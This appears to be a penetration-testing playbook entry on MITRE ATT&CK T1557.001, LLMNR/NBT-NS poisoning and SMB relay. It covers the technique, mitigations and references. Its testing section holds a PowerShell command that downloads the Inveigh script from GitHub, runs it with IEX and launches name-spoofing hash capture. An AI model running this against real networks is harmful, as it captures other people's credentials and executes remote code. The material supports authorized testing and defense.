---
name: "T1557.001_llmnrnbt-ns-poisoning-and-smb-relay"
description: "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1557.001
  - credential-access
  - collection
  - windows
  - sub-technique
technique_id: "T1557.001"
tactic: "credential-access"
all_tactics:
  - credential-access
  - collection
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1557/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1557
  - T1557.002
  - T1557.003
  - T1557.004
prerequisites:
  - T1557
severity_boost:
  T1557: "Chain with T1557 for deeper attack path"
  T1557.002: "Chain with T1557.002 for deeper attack path"
  T1557.003: "Chain with T1557.003 for deeper attack path"
---

# T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay

> **Sub-technique of:** T1557

## High-Level Description

By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 

Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.

## Kill Chain Phase

- Credential Access (TA0006)
- Collection (TA0009)

**Platforms:** Windows

## What to Check

- [ ] Identify if LLMNR/NBT-NS Poisoning and SMB Relay technique is applicable to target environment
- [ ] Check Windows systems for indicators of LLMNR/NBT-NS Poisoning and SMB Relay
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: LLMNR Poisoning with Inveigh (PowerShell)

Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to LLMNR/NBT-NS Poisoning and SMB Relay by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1557.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program

Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment.

### M1031 Network Intrusion Prevention

Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level.

### M1030 Network Segmentation

Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity.

### M1037 Filter Network Traffic

Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks.

## Detection

### Detect LLMNR/NBT-NS Poisoning and SMB Relay on Windows

## Risk Assessment

| Finding                                                   | Severity | Impact            |
| --------------------------------------------------------- | -------- | ----------------- |
| LLMNR/NBT-NS Poisoning and SMB Relay technique applicable | High     | Credential Access |

## CWE Categories

| CWE ID  | Title                                |
| ------- | ------------------------------------ |
| CWE-522 | Insufficiently Protected Credentials |

## References

- [Rapid7 LLMNR Spoofer](https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response)
- [GitHub Responder](https://github.com/SpiderLabs/Responder)
- [Secure Ideas SMB Relay](https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html)
- [TechNet NetBIOS](https://technet.microsoft.com/library/cc958811.aspx)
- [GitHub NBNSpoof](https://github.com/nomex/nbnspoof)
- [GitHub Conveigh](https://github.com/Kevin-Robertson/Conveigh)
- [byt3bl33d3r NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [Sternsecurity LLMNR-NBTNS](https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning)
- [Wikipedia LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)
- [Atomic Red Team - T1557.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1557.001)
- [MITRE ATT&CK - T1557.001](https://attack.mitre.org/techniques/T1557/001)
